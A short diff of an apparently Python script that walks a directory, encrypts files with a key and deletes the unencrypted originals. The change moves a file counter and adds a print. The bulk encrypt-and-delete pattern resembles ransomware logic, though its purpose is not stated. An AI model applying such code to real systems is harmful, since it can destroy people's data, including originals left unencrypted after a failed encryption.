@@ -101,12 +101,14 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             if function == 0:    
                     try:
                         encrypt_file(key, filename, None, 64*1024)
+                        filesChanged += 1
+                        print(filesChanged)
                     except:
                         print("Permission denied")    
                     try: 
                         if not ".enc" in filename:
                             shutil.rmtree(filename)
-                            filesChanged += 1
+                            
                     except OSError:
                             print("cant delete :(")
             elif function == 1:
